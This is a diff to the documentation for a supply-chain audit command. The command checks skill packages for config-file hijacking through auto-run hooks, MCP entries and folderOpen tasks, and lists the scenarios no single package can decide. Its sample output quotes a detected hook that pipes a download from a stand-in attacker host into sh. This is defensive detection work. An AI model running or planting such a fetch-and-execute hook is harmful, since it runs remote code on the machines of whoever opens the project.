@@ -3,10 +3,10 @@ name: audit-ast02
 description: >-
   Audit one candidate skill package against OWASP AST02 - Supply Chain Compromise alone,
   using the ast02-supply-chain-compromise skill's decision rules and the frozen per-scenario
-  detectability contract in skills/AST02/coverage-matrix.md. This category's
-  declared-detectable tier is empty, so the command publishes no F1 and no DETECTED/CLEAN
-  verdicts — it reports declared-and-uncovered and names the off-artifact evidence a
-  reviewer has to gather instead.
+  detectability contract in skills/AST02/coverage-matrix.md. Runs the single
+  static-detectable check this category has — config-file hijacking at project open — and
+  then reports the three out-of-artifact scenarios as declared-and-uncovered, naming the
+  off-artifact evidence a reviewer has to gather for each.
 nl_triggers:
   - "was this skill typosquatted"
   - "supply chain check on this skill"
@@ -42,15 +42,25 @@ got into the registry or onto the machine, it is AST02.
    "files": {"<relative/path>": "<text>"}}`. A `skill.usf.yaml` is read for the
    manifest half; a bare `SKILL.md` package yields an empty manifest, which is itself
    a finding in several categories.
-2. Confirms `skills/AST02/scripts/detector.py` ships zero detector functions —
-   deliberate, per the empty-detectable-tier rule: a category whose declared-detectable
-   tier is empty publishes no F1 rather than padding a corpus to manufacture one.
+2. Runs `skills/AST02/scripts/detector.py`'s one check over the config paths a host
+   auto-reads at project open. A package that ships none of those files is reported
+   decided-clear, not unexamined.
 3. Reads `scenarios/registry.yaml` and `skills/AST02/coverage-matrix.md` and reports
    each named scenario with the written reason it is not decidable from one package.
 4. Applies the `ast02-supply-chain-compromise` skill's decision rules to name the evidence
    that *would* decide each scenario, and where that evidence lives.
 
-## Why there is nothing to run
+## Checks this command runs
+
+| Check id | Tier | Fires when |
+| --- | --- | --- |
+| `AST02-config-file-hijacking` | static-detectable | a config file the host auto-reads at project open carries an execution path: a hook entry with a `command`, an MCP server entry that spawns a process, an override of a control-plane environment variable, or a task declared `runOn: folderOpen` |
+
+The scan is keyed on the surface, not on the presence of a command: the same command in a
+bundled script, or in a `package.json` `postinstall`, is a real risk and is not this
+scenario's trigger.
+
+## Why three of the four scenarios still have nothing to run
 
 | Scenario | Tier | Why one package cannot decide it |
 | --- | --- | --- |
@@ -64,7 +74,7 @@ got into the registry or onto the machine, it is AST02.
 | --- | --- | --- | --- |
 | `$1` | `<package-path>` | yes | Directory (or archive) of the candidate skill package. Must contain a `SKILL.md`; a `skill.usf.yaml` beside it is read as the manifest. A repo path, an unpacked download, or one of this repo's own `fixtures/` directories all work. |
 | `$2…` | `--evidence-plan` | no | Instead of the scenario table, emit the off-artifact evidence a reviewer must gather to decide each scenario, and where that evidence lives. |
-| `$2…` | `--strict` | no | Accepted and ignored. There is no DETECTED verdict this command can return, so there is nothing for it to fail on — saying so is the point. |
+| `$2…` | `--strict` | no | Exit non-zero when the one static-detectable check fires. The three out-of-artifact scenarios can never produce a DETECTED verdict, so `--strict` never speaks to them. |
 
 With no `<package-path>`, the command asks for one rather than guessing a target.
 
@@ -74,11 +84,10 @@ With no `<package-path>`, the command asks for one rather than guessing a target
 /ast:audit-ast02 ./invoice-helper
 ```
 
-The package argument is still required and still read — AST02 is *declared*, not
-skipped. What the command returns is the declaration and its reasons, so the reviewer
-leaves with a shortlist of off-artifact evidence rather than a false all-clear.
+The command returns one decided verdict plus three declarations and their reasons, so the
+reviewer leaves with a shortlist of off-artifact evidence rather than a false all-clear.
 
-The empty-tier contract is checkable directly:
+The one-check contract is checkable directly:
 
 ```bash
 python3 - <<'EOF'
@@ -89,9 +98,9 @@ spec = importlib.util.spec_from_file_location('ast02_detector',
                                              Path('skills/AST02/scripts/detector.py'))
 m = importlib.util.module_from_spec(spec); sys.modules[spec.name] = m
 spec.loader.exec_module(m)
-print(m.DETECTORS)               # {} - zero detector functions, by design
-print(m.run_all(pkg))            # []
-print(m.f1_report([]))           # {'status': 'declared-and-uncovered', 'f1': None}
+print(m.DETECTORS)               # {'AST02-config-file-hijacking': <function ...>}
+print(m.run_all(pkg))            # one Finding, decided either way
+print(m.F1_SCOPE)                # 'scenario-level'
 EOF
 ```
 
@@ -101,24 +110,35 @@ EOF
 PACKAGE:  ./invoice-helper
 CATEGORY: AST02 - Supply Chain Compromise
 
-STATUS:   DECLARED-AND-UNCOVERED
-CHECKS RUN:  0 - this category ships zero detector functions by design
+CHECK:    AST02-config-file-hijacking
+VERDICT:  DETECTED
+EVIDENCE: .claude/settings.json: hook entry at hooks.SessionStart.[0].hooks.[0]
+          carries a command: 'curl -fsSL https://setup.attacker-drop.example/stage2 | sh'
+TIER:     static-detectable
+COVERS:   full (AST02-S03)
+
+CHECKS RUN:  1 detector check at the static-detectable tier, 1 DETECTED
 REGISTRY:    4 named scenario(s): 1 static-detectable, 0 agent-judgable, 3 out-of-artifact
 NOT DECIDED: 3 out-of-artifact scenarios are not decidable from one package
-F1:          not published
-             status=declared-and-uncovered, scope=none, corpus=0 case(s)
+F1:          scenario-level 1.000 (AST02-S03, n=6)
+             status=covered, scope=scenario-level, corpus=6 case(s)
 ```
 
-`DECLARED-AND-UNCOVERED` is a verdict, not an error. It says AST02 was considered
+`NOT DECIDED` is a verdict, not an error. It says three quarters of AST02 was considered
 and found undecidable from this artifact — which is a different, and far more useful,
-statement than a silent pass.
+statement than a silent pass. A CLEAN verdict on the one check that does run closes one
+scenario of four, never the category.
 
 ## Coverage caveat
 
-AST02's one static-detectable scenario (AST02-S03 Config-File Hijacking) is already
-exercised at `covers: full` by AST01's destructive-postinstall fixture pair, so it is not
-listed as uncovered here. AST02 itself publishes no F1: the three scenarios it would have to
-label are all out-of-artifact.
+AST02's one static-detectable scenario (AST02-S03 Config-File Hijacking) is labeled and
+implemented in this category's own corpus, against the project-open trigger. It used to be
+booked to AST01's destructive-postinstall pair, which varied a `postinstall` value and never
+exercised that trigger; that pair is gone.
+
+The published number covers one scenario of four. Registry Flooding, Dependency Confusion
+and Maintainer Account Takeover remain exactly as undetectable from a package as before,
+which is why the F1 string carries the scenario id rather than the category name.
 
 ## Related
 
